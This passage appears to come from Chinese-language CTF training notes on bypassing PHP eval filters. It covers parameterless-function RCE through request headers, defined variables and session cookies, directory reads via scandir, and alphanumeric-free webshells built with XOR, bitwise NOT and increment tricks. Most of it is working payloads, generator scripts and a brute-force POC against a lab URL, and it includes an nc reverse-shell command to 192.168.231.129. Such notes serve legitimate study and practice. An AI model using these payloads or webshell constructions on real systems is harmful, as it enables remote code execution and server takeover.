    payload_list2 = [">ash", ">b\\", '>\|\\', '>81\\', '>E7\\', '>A8\\', '>C0\\', '>0x\\', '>\ \\', '>rl\\', '>cu\\']

    rst = ''
    for i in payload_list1:
        rst += ' ' + i
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + i).text

    rst = ''
    for j in payload_list2:
        rst += ' ' + j
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + j).text

    requests.get(base_url + "sh x")
    requests.get(base_url + "sh g")
```

## 0x15. 无参数命令执行请求头绕过（PHP 7.0）

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

正则表达式解析

```php
/[^\W]+\((?R)?\)/
    
[^\W]+：等于 [\w]+，表示匹配 字母、数字_下划线
\(：匹配 (
\)：匹配 )
?R：递归匹配。能匹配 a(b(c()))
总结：能匹配所有不带参数的函数
```

### 前置知识

#### `getallheaders` 函数

`getallheaders` — 获取全部 HTTP 请求头信息

```
getallheaders ( void ) : array
```

##### 返回值

包含当前请求所有头信息的数组，失败返回 **`FALSE`** 。

#### `end()`函数

`end` — 将数组的内部指针指向最后一个单元；返回数组中的最后一个元素

end ( array `&$array` ) : [mixed](language.pseudo-types.html#language.types.mixed)

**end()** 将 `array` 的内部指针移动到最后一个单元并返回其值。

##### 参数



- `array`

  这个数组。 该数组是通过引用传递的，因为它会被这个函数修改。 这意味着你必须传入一个真正的变量，而不是函数返回的数组，因为只有真正的变量才能以引用传递。

##### 返回值

返回最后一个元素的值，或者如果是空数组则返回 **`FALSE`**。

#### `pos()` 函数

**是函数`current()`的别名**

##### 说明

```
current ( array `&$array` ) : [mixed](language.pseudo-types.html#language.types.mixed)
```

每个数组中都有一个内部的指针指向它“当前的”单元，初始指向插入到数组中的第一个单元。

##### 参数

- `array`

  这个数组。

##### 返回值

**current()** 函数返回当前被内部指针指向的数组单元的值，并不移动指针。如果内部指针指向超出了单元列表的末端，**current()** 返回 **`FALSE`**。

### 思路

1. 利用`eval()`函数执行函数

2. 通过修改请求头的方式执行想要执行的命令

3. 通过函数`getallheaders()`获取请求头；如果不行，可以尝试使用`apache_request_headers()`

4. 通过`pos()`、`end()`、`current()`函数获取命令

5. 最后包裹`system()`执行命令

   ```bash
   payload：?code=system(pos(getallheaders()));
   ```

### 解题流程

#### 1. 获取请求头

注意：这里的输出是将请求头的内容倒序输出

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173806266.png" alt="image-20230816173806266" style="zoom:80%;" />

#### 2. 获取指定内容

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173906487.png" alt="image-20230816173906487" style="zoom:80%;" />

#### 3. 修改请求头

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173940951.png" alt="image-20230816173940951" style="zoom:80%;" />

#### 4. 执行命令

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816174015690.png" alt="image-20230816174015690" style="zoom:80%;" />

## 0x16. 无参数全局变量RCE（PHP 5/7）

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

### 前置知识

#### get_defined_vars

(PHP 4 >= 4.0.4, PHP 5, PHP 7)

get_defined_vars — ==返回由所有已定义变量所组成的数组==

##### 描述

```
get_defined_vars ( void ) : array
```

此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

### 解题流程

大致手法和思路跟上一题一样，不过这种方法更加灵活适用

```
payload：system(end(pos(get_defined_vars())));&cmd=cat+flag;
```

#### 1. 查看当前所有变量

```
?code=var_dump(get_defined_vars());
```

![image-20230816215701700](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215701700.png)

#### 2. 增加变量-->命令

```
?code=var_dump(get_defined_vars());&cmd=ls;
```

![image-20230816215830837](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215830837.png)

#### 3. 抓取变量

先用`pos()`方法将全局数组`$_GET`，再使用`end()`方法抓`ls`

```
?code=var_dump(pos(get_defined_vars()));&cmd=ls;
?code=var_dump(end(pos(get_defined_vars())));&cmd=ls;
```

![image-20230816215924585](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215924585.png)

![image-20230816220039674](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816220039674.png)

#### 4. 执行命令

由于例题中，有一个`eval()`函数包裹，所以这里直接执行`system()`就行

```
?code=system(end(pos(get_defined_vars())));&cmd=ls;
```

![image-20230816220129093](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816220129093.png)

## 0x17. 无参数session RCE

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

### 思路

1. 首先查看请求头是否携带了`cookie`，没有就使用函数`session_start()`开启

2. 使用`session_id()`获取`cookie`值

3. 使用`system()`执行命令

   注意：由于请求头中的`Cookie`只接受 数字和字符，所以如果想往里面输入空格或者括号的话，就需要使用`HEX`编码，然后在payload中使用函数`hex2bin()`来解码

### 解题流程

#### 1. 开启Session

这一步需要先在浏览器执行，不要直接在Burp Suite上做，否则会抓不到Cookie

```
?code=var_dump(session_start());
```

![image-20230816222201773](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222201773.png)

#### 2. 获取Session值

```
?code=var_dump(session_id(session_start()));
```

![image-20230816222323558](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222323558.png)

#### 3. 修改Cookie值

![image-20230816222521768](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222521768.png)

#### 4. 执行命令

```
system(session_id(session_start()));
```

![image-20230816222546769](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222546769.png)

#### 5. 编码绕过

由于如果先执行`cat flag`命令，其中带有空格，所以Cookie会事变不了，这里使用`HEX`编码，注意使用函数`hex2bin()`解码

```
?code=system(hex2bin(session_id(session_start())));
```

![image-20230816222810927](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222810927.png)

## 0x18. 无参数`scandir`读取（上）

### 可利用函数

```
scandir() -- 列出指定路径终端文件和目录（PHP 5、PHP 7、PHP 8）
getcwd() -- 获取当前工作路径（PHP 4、PHP 7、PHP 8）
current() -- 返回数组中的当前值（PHP 4、PHP 5、PHP 7、PHP 8）
array_reverse() -- 将指定数组倒序返回（PHP 4、PHP 5、PHP 7、PHP 8）
array_flip() -- 交换数组中的键和值（PHP 4、PHP 5、PHP 7、PHP 8）
next() -- 将数组中的内部指针向前移动并返回值（PHP 4、PHP 5、PHP 7、PHP 8）
array_rand() -- 从数组中随机取出一个或多个随机值，若只取出一个，则返回键名
strrev() -- 将指定字符串反转倒序输出
crypt() -- 用来加密
hebrev() -- 把希伯来文从右至左的流转换为左至右的流
```

## 0x19. 无参数`scandir`读取（下）

### 读取上一目录

```
payload：show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));
```

#### 讲解

1. `getcwd()`：函数读取当前工作路径、返回一个路径
2. `dirname()`：读取路径并返回该路径的父路径
3. `chdir()`：相当于`cd`命令，进入指定路径
4. `dirname`：继续返回父路径，此时的路径为`.`
5. `scandir()`：扫描指定路径的文件和文件夹
6. `end()`：使用`end、pos、next`等函数来指定要查看的文件
7. `show_source()`：读取文件，也可以使用`highlight_file()`

### 读取根目录

```
payload：show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));
```

#### 讲解

1. `array()`：打印一个空数组
2. `serialize()`：对这个空数组进行序列化，返回一串字符串
3. `crypt()`：对这串字符串进行加密，返回一串密文，这串密文包含`/`这个字符串
4. `strrev()`：对这个字符串进行倒序输出
5. `chr()、ord()`：如果输入一串字符串只会对第一个字符做运算，使用这一特性，取出字符串`/`
6. `chdir()`：更改工作路径，`cd /`
7. `dirname()`：返回当前路径的父路径并返回路径字符串
8. `scandir()`：扫描该路径的文件和文件夹
9. `array_flip()`：将数组中的键值对对调
10. `array_rand()`：随机获取数组中的某一个键名
11. `show_source`：读取文件，也可以使用`highlight_file()`

总结：要成功得到`/`目录下的`flag`，要两个前提条件：

1. 加密的密文字符串中的最后一位字符必须是`\`
2. `array_rand()`：随机到的条目必须是`flag`文件

#### POC代码

```py
import requests

base_url = 'http://47.120.43.120:18082/class10/1.php?code='
payload = 'show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));'

for i in range(4000):
    res = requests.get(base_url + payload).text
    print(res)
```

## 0x20. 无字母数字异或运算绕过

### 1. 异或运算

将一串二进制字符串进行逐位异或运算，**相同为0，不同为1**

### 2. 异或运算脚本

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
$shell = $_GET["cmd"];
$result1 = "";
$result2 = "";

function judge($c)
{
    if(!preg_match('/[a-z0-9]/is',$c))
    {
        return true;
    }
    return false;
}

for($num=0;$num<=strlen($shell);$num++)
{
    for($x=33;$x<=126;$x++)
    {
        if(judge(chr($x)))
        {
            for($y=33;$y<=126;$y++)
            {
                if(judge(chr($y)))
                {
                    $f = chr($x)^chr($y);
                    if($f == $shell[$num])
                    {
                        $result1 .= chr($x);
                        $result2 .= chr($y);
                        break 2;
                    }
                }
            }
        }
    }
}
echo "异或运算第一部分： ".$result1;
echo "<br>";
echo "异或运算第二部分： ".$result2;
```

### 3. PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
```

#### POC 代码

```php
<?php
$_ = '("((%-'^'[[[\@@';		// 异或结果：system
$__ = '!+/(('^'~{`{|';		// 异或结果：_POST
$___ = $$__;				// $___ = $_POST; $$__ = $_POST
$_($___['____']);			// 代码拼接：system($_POST['____'])
```

#### payload

提交之前需先做**URL编码**

```
cmd=$_ = '("((%-'^'[[[\@@';$__ = '!+/(('^'~{`{|';$___ = $$__;$_($___['____']);
```

此时即可使用POST提交要执行的命令

![image-20230821165943022](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821165943022.png)

#### 扩展

如果对方禁止了`system、eval、passthru`等函数的执行，那么可以使用反引号来执行命令；但是由于反引号没有回显，所以此时我们可以直接使用nc回弹`webshell`

## 0x21. 无字母数字取反绕过

### 取反运算

将二进制序列逐位取反计算

例如：现有一串二进制字符串`1001`，取反运算后结果位：`0110`

### PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### POC代码

```php
$_ = ~('%9e%8c%8c%9a%8d%8b');			// 取反运算结果：assert
$__ =  ~('%a0%af%b0%ac%ab');			// 取反运算结果：_POST
$___ = $$__;							// $__ = _POST; $$__ = $_POST
$_($___['____']);						// 代码组装：assert($_POSTp['____'])
```

```
payload：
GET传参：
cmd=$_ = ~('%9e%8c%8c%9a%8d%8b');$__ =  ~('%a0%af%b0%ac%ab');$___ = $$__;$_($___['____']);

POST传参：
____=system('cat flag')
```

![image-20230821205218805](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821205218805.png)

#### 取反运算计算脚本

```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
$shell = $_GET['cmd'];
$result = "";
$arr =array();
$word = "一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺
木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引
丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们
仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾
扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传
乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅
字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖
护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我
乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟
没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖
拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚
旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿
胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试
郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪
某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂
哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀
饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误
诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫
荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积
秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳
粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继
球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇
圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐
混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬
葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩
稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙
谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳
跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静
碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱
嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐
嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾
夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛
吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙
呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤
荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦
匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋
疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾
啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽
缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔
奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙
腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥
谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥
霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹
靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗";
function mb_str_split( $string ) {
    return preg_split('/(?<!^)(?!$)/u', $string );
}
foreach (mb_str_split($word) as $c)
{
    $arr[] = $c;
}

for ($x=0;$x<strlen($shell);$x++)
{
    for ($y=0;$y<count($arr);$y++)
    {
        $k = $arr[$y];
        if ($shell[$x] == ~($k{1}))
        {
            $result .= $k;
            $result1 .= "%".bin2hex($k{1});
            break;
        }
    }
}
echo "通过在URL内GET方法提交?cmd=\"具体命令\"";
echo "<br>";
echo "字符串：".$result;
echo "<br>";
echo "URL编码：".$result1;

```

### 反引号返回webshell

题目与`PHP 5.0`一样，但是由于反引号没有回显，所以无法直接读取文件

#### POC 代码

```php
<?php
$__ =  ~('%a0%af%b0%ac%ab');
$___ = $$__;
`$___[_]`;
```

#### payload

```
GET 传参：
cmd=$__ =  ~('%a0%af%b0%ac%ab');$___ = $$__;`$___[_]`;	

POST 传参：
_=nc 192.168.231.129 7777 -e /bin/bash
```

## 0x22. 无字母数字自增绕过

### 自增运算

在 PHP 中，自增运算符 `++` 可以用来将变量的值增加 1。它有两种形式：前自增和后自增。

- 前自增：`++$a`。它将 `$a` 的值加 1，然后返回 `$a`。
- 后自增：`$a++`。它返回 `$a` 的值，然后将 `$a` 的值加 1。

```php
<?php
echo "<h3>Postincrement</h3>";
$a = 5;
echo "Should be 5: " . $a++ . "<br />\n";
echo "Should be 6: " . $a . "<br />\n";

echo "<h3>Preincrement</h3>";
$a = 5;
echo "Should be 6: " . ++$a . "<br />\n";
echo "Should be 6: " . $a . "<br />\n";
?>
```

### 解题思路

如果我们获取了字符串`a`，那么就可以通过自增运算，获取所有想要的字符

```php
<?php
$a = 'a';
echo ++$a;

// 输出 b
```

此时的问题时如何获取到字符`a`呢？

通过在后面追加空字符串，使得类型变成`str`，再通过切片来获得想要的字符

```php
$a = [];
echo $a;

// 输出 Array

$a = [].'';
echo $a[0];

// 输出 A
```

### POC生成脚本

不准确，需要将结果再修改

```php
<?php
highlight_file(__FILE__);
$cmd = strtoupper($_GET['cmd']);
$cmd2 = strtoupper($_GET['post']);
function POC($cmd){
    $i = 0;
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$_ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1);
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}

function POC2($cmd){
    $i = 0;
    echo '$____ = "_";$__=$___;';
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$____ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1).$POC_pat2;
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}


if (!empty($cmd)){
    $POC_pat7 = "\$_=[].'';\$___=\$_[\$__];\$__=\$___;\$_=\$___;";
    echo $POC_pat7;
    POC($cmd);
}
if (!empty($cmd2)){
    POC2($cmd2);
}
```

### PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### POC 代码

```php
<?php
// ASSERT
$_=[].'';
$___=$_[$__];$__=$___;$_=$___;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;
// 
$____ = "_";
$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;
$__ = $$____;
$_($__[_____]);
```

#### payload

